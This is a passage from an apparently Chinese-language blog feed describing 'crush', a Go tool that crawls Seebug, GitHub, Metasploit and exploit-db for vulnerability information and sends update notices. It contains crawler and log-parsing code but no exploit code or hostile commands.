 <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-extensions&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-features&quot;</span>, <span class="hljs-string">&quot;site-per-process,Translate,BlinkGenPropertyTrees&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-hang-monitor&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-ipc-flooding-protection&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-popup-blocking&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-prompt-on-repost&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-renderer-backgrounding&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;disable-sync&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;force-color-profile&quot;</span>, <span class="hljs-string">&quot;srgb&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;metrics-recording-only&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;safebrowsing-disable-auto-update&quot;</span>, true),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;enable-automation&quot;</span>, true),  <span class="hljs-comment">// 会显示自动化测试标识  </span><br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;password-store&quot;</span>, <span class="hljs-string">&quot;basic&quot;</span>),  <br><span class="hljs-built_in">Flag</span>(<span class="hljs-string">&quot;use-mock-keychain&quot;</span>, true),  <br>&#125;<br></code></pre></td></tr></table></figure><p>headless 参数如果设置为 false，就会打开一个窗口，反之则无，为了调试方便这里将参数设置为 false。<br>通过 chromedp.Navigate()导航到 baidu，再通过 chromedp.SendKeys()模拟键盘输入，QueryOptions 设置为 ByID，再找到 id 为 kw 的部分，实现了在搜索框中输入内容：<br><img src="/2023/04/27/file-upload/image-20240126140736499.png"><br>接着通过 chromedp.WaitVisible()等待搜索按钮出现，并进行点击：<br><img src="/2023/04/27/file-upload/image-20240126141158241.png"><br>最终结果如下：<br><img src="/2023/04/27/file-upload/image-20240126140926830.png"><br>下面尝试访问 seebug。<br><img src="/2023/04/27/file-upload/image-20240126141631453.png"><br>chrome 打开了一个空白网页，可能是有反爬的逻辑，在 options 中添加头：<code>chromedp.Flag(&quot;disable-blink-features&quot;, &quot;AutomationControlled&quot;),</code> 即可。<br><img src="/2023/04/27/file-upload/image-20240126142002894.png"><br>在控制台中查看 window.navigator.webdriver，可以发现不加参数时为 true，加上参数之后 webdriver 变为 false。<br><img src="/2023/04/27/file-upload/image-20240126142320638.png"><br>目前已经能够正常访问，尝试打印出 html 内容：<br><img src="/2023/04/27/file-upload/image-20240126142707838.png"><br>可以看到网页还在加载，打印出的内容依然是混淆的 js 数据。<br>这里只需要 sleep 一段时间等待网页加载完成就好：<br><img src="/2023/04/27/file-upload/image-20240126143131960.png"><br>或者使用更高效的方法，例如等待第一个漏洞的漏洞名称加载完再打印：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">xpath</span> := <span class="hljs-string">&quot;/html/body/div[2]/div/div/div/div/table/tbody/tr[1]/td[4]/a&quot;</span><br>chromedp.WaitVisible(<span class="hljs-keyword">xpath</span>, chromedp.BySearch),<br></code></pre></td></tr></table></figure><p>能够拿到正确的html之后，进行解析提取出想要的信息即可。</p><h2 id="爬取逻辑"><a href="#爬取逻辑" class="headerlink" title="爬取逻辑"></a>爬取逻辑</h2><p>每天凌晨通过chromedp访问seebug漏洞库第一页的内容，通过提交时间判断是否为新漏洞，如果是则插入数据库。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="/2023/04/27/file-upload/image-20240229134844024.png" alt="image-20240229134844024"></p><p>目前seebug源的监控已经加入crush项目:<a href="https://github.com/leesinz/crush">https://github.com/leesinz/crush</a></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>seebug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控03——metasploit 漏洞信息监控</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A703%E2%80%94%E2%80%94metasploit%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A703%E2%80%94%E2%80%94metasploit%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%9B%91%E6%8E%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控03——metasploit-漏洞信息监控"><a href="#golang-实现漏洞监控03——metasploit-漏洞信息监控" class="headerlink" title="golang 实现漏洞监控03——metasploit 漏洞信息监控"></a>golang 实现漏洞监控03——metasploit 漏洞信息监控</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>监控 metasploit 官方的 github 源，如果有更新，则通过脚本处理，筛选出是否为 exploit，是否有 cve 号等等，并通过邮件推送。</p><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p><img src="/2023/04/27/file-upload/age-20240124120435006.png"><br>首先通过 init 参数，将 metasploit 仓库 clone 到本地，接着通过 monitor 参赛来进行日常监控。<br>完整的流程如图所示，主要看一下 check 的部分。</p> <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs stylus"> func <span class="hljs-built_in">CheckMSFUpdate</span>() &#123;  <br>    result := <span class="hljs-string">&quot;&quot;</span>  <br>    file, err := os<span class="hljs-selector-class">.Open</span>(updateInfoPath)  <br>    <span class="hljs-keyword">if</span> err != nil &#123;  <br>       fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;open file err:&quot;</span>, err)  <br>       return  <br>    &#125;  <br>    defer file<span class="hljs-selector-class">.Close</span>()  <br>  <br>    scanner := bufio<span class="hljs-selector-class">.NewScanner</span>(file)  <br>    <span class="hljs-keyword">for</span> scanner<span class="hljs-selector-class">.Scan</span>() &#123;  <br>       <span class="hljs-selector-tag">line</span> := scanner<span class="hljs-selector-class">.Text</span>()  <br>       <span class="hljs-keyword">if</span> upToDate<span class="hljs-selector-class">.MatchString</span>(line) &#123;  <br>          <span class="hljs-comment">//fmt.Println(&quot;Already up to date.&quot;)  </span><br>          result += <span class="hljs-string">&quot;Already up to date.&quot;</span>  <br>       &#125;  <br>  <br>       <span class="hljs-keyword">if</span> newExploitInfo<span class="hljs-selector-class">.MatchString</span>(line) &#123;  <br>          cveFlag := <span class="hljs-string">&quot;&quot;</span>  <br>          newFilePath := newExploitInfo<span class="hljs-selector-class">.FindStringSubmatch</span>(line)<span class="hljs-selector-attr">[1]</span>  <br>          file, err := os<span class="hljs-selector-class">.Open</span>(msfDir + <span class="hljs-string">&quot;/&quot;</span> + newFilePath)  <br>          <span class="hljs-keyword">if</span> err != nil &#123;  <br>             fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-string">&quot;Error opening file:&quot;</span>, err)  <br>             return  <br>          &#125;  <br>          scanner := bufio<span class="hljs-selector-class">.NewScanner</span>(file)  <br>          <span class="hljs-keyword">for</span> scanner<span class="hljs-selector-class">.Scan</span>() &#123;  <br>             rbLine := scanner<span class="hljs-selector-class">.Text</span>()  <br>             <span class="hljs-keyword">if</span> cvePattern<span class="hljs-selector-class">.MatchString</span>(rbLine) &#123;  <br>                sub := cvePattern<span class="hljs-selector-class">.FindStringSubmatch</span>(rbLine)  <br>                cve := sub<span class="hljs-selector-attr">[1]</span> + <span class="hljs-string">&quot;-&quot;</span> + sub<span class="hljs-selector-attr">[2]</span>  <br>                newCVEInfos<span class="hljs-selector-attr">[cve]</span> = newFilePath  <br>                cveFlag = cve + <span class="hljs-string">&quot;:&quot;</span>  <br>             &#125;  <br>          &#125;  <br>          result += cveFlag + newFilePath + <span class="hljs-string">&quot;\n&quot;</span>  <br>       &#125;  <br>    &#125;  <br>    <span class="hljs-comment">//fmt.Println(result)  </span><br>    now := <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()<span class="hljs-selector-class">.Format</span>(<span class="hljs-string">&quot;2006-01-02&quot;</span>)  <br>    logContent := now + <span class="hljs-string">&quot;\n&quot;</span> + result  <br>    utils<span class="hljs-selector-class">.WriteToLog</span>(logContent, mailLogPath)  <br>&#125;<br></code></pre></td></tr></table></figure><p>也就是对 git pull 的信息进行正则匹配，再到 rb 文件里找 CVE 号，并记录日志。</p><h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="/2023/04/27/file-upload/age-20240124122712361.png"><br>参数为 init 时，首先将仓库克隆到本地。<br>参数为 monitor 时，git pull 并且对数据进行处理，本地仓库已经是最新，因此 mail_log，msf_update_info.log,msf_update_history.log 都为 Already up to date.<br>将 log 改为如下内容进行测试：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">2022</span>-<span class="hljs-number">03</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span><br>Updating <span class="hljs-number">0080718</span>..c63490c<br>Fast-forward<br> db/modules_metadata_base.json                      |  <span class="hljs-number">56</span> +++<br> ...<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.md      | <span class="hljs-number">210</span> ++++++++++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/api_constants.rb    |  <span class="hljs-number">35</span> +-<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_advapi32.rb     |  <span class="hljs-number">71</span> ++++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_ntdll.rb        |   <span class="hljs-number">6</span> +<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_spoolss.rb      |  <span class="hljs-number">28</span> ++<br> ...<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_winspool.rb     | <span class="hljs-number">102</span> +++++<br> ...<span class="hljs-regexp">/extensions/</span>stdapi<span class="hljs-regexp">/railgun/</span>railgun.rb           |   <span class="hljs-number">4</span> +-<br> ...<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.rb      | <span class="hljs-number">429</span> +++++++++++++++++++++<br> <span class="hljs-number">9</span> files changed, <span class="hljs-number">939</span> insertions(+), <span class="hljs-number">2</span> deletions(-)<br> create mode <span class="hljs-number">100644</span> documentation<span class="hljs-regexp">/modules/</span>exploit<span class="hljs-regexp">/windows/</span>local/cve_2022_21999_spoolfool_privesc.md<br> create mode <span class="hljs-number">100644</span> lib<span class="hljs-regexp">/rex/</span>post<span class="hljs-regexp">/meterpreter/</span>extensions<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_spoolss.rb<br> create mode <span class="hljs-number">100644</span> lib<span class="hljs-regexp">/rex/</span>post<span class="hljs-regexp">/meterpreter/</span>extensions<span class="hljs-regexp">/stdapi/</span>railgun<span class="hljs-regexp">/def/</span>windows/def_winspool.rb<br> create mode <span class="hljs-number">100644</span> modules<span class="hljs-regexp">/exploits/</span>windows<span class="hljs-regexp">/local/</span>cve_2022_21999_spoolfool_privesc.rb<br></code></pre></td></tr></table></figure><p>成功解析到更新的模块，并且将日志写入了 log 文件。<br><img src="/2023/04/27/file-upload/age-20240124123021951.png"> </p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang 实现漏洞监控02——github 历史漏洞信息爬取</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A702%E2%80%94%E2%80%94github%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A702%E2%80%94%E2%80%94github%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="golang-实现漏洞监控02——github-历史漏洞信息爬取"><a href="#golang-实现漏洞监控02——github-历史漏洞信息爬取" class="headerlink" title="golang 实现漏洞监控02——github 历史漏洞信息爬取"></a>golang 实现漏洞监控02——github 历史漏洞信息爬取</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>从 github 的相关 API 接口搜索关键字 CVE-{YEAR}，并且按照 <code>best-match</code> 进行排序，获取每年的 CVE 中前 1000 个，再进行判活，去重等等筛选，最终存入数据库。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="getGithubHeader"><a href="#getGithubHeader" class="headerlink" title="getGithubHeader()"></a>getGithubHeader()</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getGithubHeader</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span> &#123;  <br>    token := cfg.Github.GithubToken  <br>    header := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;  <br>       <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;token &quot;</span> + token,  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> header  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用于从 config 文件中获取 github token，如果不加上 token 访问，1h 只能访问 50 次：<br><img src="/2023/04/27/file-upload/image-20240108165255971.png"><br>加上 token 后尝试：<br><img src="/2023/04/27/file-upload/image-20240108165334891.png"><br>请求次数变成 6000.<br>更多详细配置参考官方文档：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cardlink">url: https://docs.github.com/v3/search/<br>title: &quot;Search - GitHub Docs&quot;<br>description: &quot;Use the REST API to search for specific items on GitHub.&quot;<br>host: docs.github.com<br>favicon: /crush_github/cb-345/images/site/favicon.png<br>image: https://github.githubcrush_github.com/images/modules/open_graph/github-logo.png<br></code></pre></td></tr></table></figure><h3 id="getCVEInfo-cve-string"><a href="#getCVEInfo-cve-string" class="headerlink" title="getCVEInfo(cve string)"></a>getCVEInfo(cve string)</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getCVEInfo</span><span class="hljs-params">(cve <span class="hljs-type">string</span>)</span></span> (exists <span class="hljs-type">bool</span>, desc, cvss2, cvss3, cna <span class="hljs-type">string</span>, err <span class="hljs-type">error</span>) &#123;  <br>    url := nvdURL + cve  <br>    res, err := http.Get(url)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error establishing connect:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, err  <br>    &#125;  <br>    <span class="hljs-keyword">defer</span> res.Body.Close()  <br>  <br>    doc, err := goquery.NewDocumentFromReader(res.Body)  <br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>       fmt.Println(<span class="hljs-string">&quot;Error parsing html:&quot;</span>, err)  <br>       <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, err  <br>    &#125;  <br>    <span class="hljs-comment">//exists</span><br>    <span class="hljs-comment">//cvss3 </span><br>    <span class="hljs-comment">//cna</span><br>    <span class="hljs-comment">//cvss2</span><br>    <span class="hljs-comment">//desc</span><br>  <br>    <span class="hljs-keyword">return</span> exists, desc, cvss2, cvss3, cna, <span class="hljs-literal">nil</span>  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用来判断 CVE 是否存在，如果存在，从返回值取出漏洞描述以及评分信息。</p><h3 id="fetchGithub-year-page-int-wg-sync-WaitGroup-countchan-chan-struct"><a href="#fetchGithub-year-page-int-wg-sync-WaitGroup-countchan-chan-struct" class="headerlink" title="fetchGithub(year, page int, wg *sync.WaitGroup, countchan chan struct{})"></a>fetchGithub(year, page int, wg *sync.WaitGroup, countchan chan struct{})</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetchGithub</span><span class="hljs-params">(year, page <span class="hljs-type">int</span>, wg *sync.WaitGroup, countchan <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;  <br>    <span class="hljs-keyword">defer</span> wg.Done()  <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    ...</span><br><span class="hljs-comment">data handle</span><br><span class="hljs-comment">...</span><br><span class="hljs-comment">*/</span><br>       err = database.InsertGithubDB(cve, desc, date_published, cvss2, cvss3, cna, poc_url)  <br>       <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;  <br>          utils.PrintColor(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;Error insert vul:&quot;</span>, cve, <span class="hljs-string">&quot;\n&quot;</span>)  <br>          <span class="hljs-keyword">continue</span>  <br>       &#125;  <br>       countchan &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;  <span class="hljs-comment">//记录插入条数</span><br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数用来完成对 github 数据的一次完整的爬取及处理。</p><h3 id="ConcurrentGitHubCrawler"><a href="#ConcurrentGitHubCrawler" class="headerlink" title="ConcurrentGitHubCrawler()"></a>ConcurrentGitHubCrawler()</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ConcurrentGitHubCrawler</span><span class="hljs-params">()</span></span> &#123;  <br>    <span class="hljs-keyword">var</span> wg, mainWG sync.WaitGroup  <br>    <span class="hljs-keyword">var</span> totalCount <span class="hljs-type">int</span>   <br>    <span class="hljs-keyword">for</span> year := startYear; year &lt;= endYear; year++ &#123;  <br>       mainWG.Add(<span class="hljs-number">1</span>)  <br>       yearCount := <span class="hljs-number">0</span>  <br>       countChan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)  <br>       <span class="hljs-keyword">for</span> page := <span class="hljs-number">1</span>; page &lt;= <span class="hljs-number">10</span>; page++ &#123;  <br>          wg.Add(<span class="hljs-number">1</span>)  <br>          <span class="hljs-keyword">go</span> fetchGithub(year, page, &amp;wg, countChan)  <br>       &#125;  <br>  <br>       <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;  <br>          wg.Wait()  <br>          <span class="hljs-built_in">close</span>(countChan)  <br>          mainWG.Done()  <br>       &#125;()  <br>  <br>       <span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> countChan &#123;  <br>          yearCount++  <br>       &#125;  <br>  <br>       utils.PrintColor(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;Successfully insert %d CVE-%d vul&quot;</span>, yearCount, year) <br>       totalCount += yearCount  <br>    &#125;  <br>    mainWG.Wait()  <br>    utils.PrintColor(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;Github: Successfully insert %d vul info&quot;</span>, totalCount)  <br>&#125;<br></code></pre></td></tr></table></figure><p>该函数实现了 fetchGithub 函数的并发操作。<br>在外层循环中，依次遍历 year，并且在 mainwg 中加 1，到内层循环里，wg 加 1，并且执行爬取处理的函数，起一个协程来等待当前 year 下所有 page 的数据爬取完成，并且关闭 countChan，当前 year 完成后，通过 for range 来统计插入数据库的条数，当所有 year 的数据爬取完成后，主协程停止等待，并打印结果。</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="/2023/04/27/file-upload/image-20240108171217387.png"></p>]]></content>
    
    
    <categories>
      
      <category>crush</category>
      
    </categories>
    
    
    <tags>
      
      <tag>crush</tag>
      
      <tag>golang</tag>
      
      <tag>github</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>golang实现漏洞监控01——exploit_db历史漏洞信息爬取</title>
    <link href="/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A701%E2%80%94%E2%80%94exploit_db%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/"/>
    <url>/2024/07/23/golang%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9B%91%E6%8E%A701%E2%80%94%E2%80%94exploit_db%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="golang实现漏洞监控01——exploit-db历史漏洞信息爬取"><a href="#golang实现漏洞监控01——exploit-db历史漏洞信息爬取" class="headerlink" title="golang实现漏洞监控01——exploit_db历史漏洞信息爬取"></a>golang实现漏洞监控01——exploit_db历史漏洞信息爬取</h1><h2 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h2><p>爬取exploit_db，github，seebug，metasploit，vulhub等多个平台的漏洞信息，并且监控每日更新，后续进行邮件推送等等。</p><p><img src="/2023/04/27/file-upload/age-20231207152846759.png" alt="image-20231207152846759"></p><p>init参数用来初始化，包括爬取历史漏洞信息等等。</p><p>crawl参数用来获取每日更新，并进行推送。</p><h2 id="exploit-db历史漏洞信息爬取"><a href="#exploit-db历史漏洞信息爬取" class="headerlink" title="exploit_db历史漏洞信息爬取"></a>exploit_db历史漏洞信息爬取</h2><p>主要分为两个模块：</p><ul><li>漏洞信息爬取</li><li>数据库操作</li></ul><h3 id="漏洞信息爬取"><a href="#漏洞信息爬取" class="headerlink" title="漏洞信息爬取"></a>漏洞信息爬取</h3><p>首先使用burp看一下请求和返回数据的包：</p><p><img src="/2023/04/27/file-upload/age-20231207153306130.png" alt="image-20231207153306130"></p><p>将url拼接到firefox访问，即可得到如下json数据：</p><p><img src="/2023/04/27/file-upload/age-20231207153553992.png" alt="image-20231207153553992"></p><p>简化后数据如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">&#123;<span class="hljs-string">&quot;draw&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;recordsTotal&quot;</span>:<span class="hljs-number">45784</span>,<span class="hljs-string">&quot;recordsFiltered&quot;</span>:<span class="hljs-number">45784</span>,<span class="hljs-string">&quot;data&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;description&quot;</span>:[<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;Splunk 9.0.5 - admin account take over&quot;</span>],<span class="hljs-string">&quot;type_id&quot;</span>:<span class="hljs-string">&quot;WebApps&quot;</span>,<span class="hljs-string">&quot;platform_id&quot;</span>:<span class="hljs-string">&quot;Multiple&quot;</span>,<span class="hljs-string">&quot;author_id&quot;</span>:[<span class="hljs-string">&quot;11999&quot;</span>,<span class="hljs-string">&quot;Redway Security&quot;</span>],<span class="hljs-string">&quot;date_published&quot;</span>:<span class="hljs-string">&quot;2023-10-09&quot;</span>,<span class="hljs-string">&quot;verified&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;application_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;application_md5&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;port&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;screenshot_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;screenshot_thumb_path&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;tags&quot;</span>:[],<span class="hljs-string">&quot;code&quot;</span>:[&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;162454&quot;</span>,<span class="hljs-string">&quot;exploit_id&quot;</span>:<span class="hljs-string">&quot;51747&quot;</span>,<span class="hljs-string">&quot;code_type&quot;</span>:<span class="hljs-string">&quot;cve&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;2023-32707&quot;</span>&#125;],<span class="hljs-string">&quot;type&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;webapps&quot;</span>,<span class="hljs-string">&quot;display&quot;</span>:<span class="hljs-string">&quot;WebApps&quot;</span>&#125;,<span class="hljs-string">&quot;platform&quot;</span>:&#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;24&quot;</span>,<span class="hljs-string">&quot;platform&quot;</span>:<span class="hljs-string">&quot;Multiple&quot;</span>&#125;,<span class="hljs-string">&quot;author&quot;</span>:&#123;<span 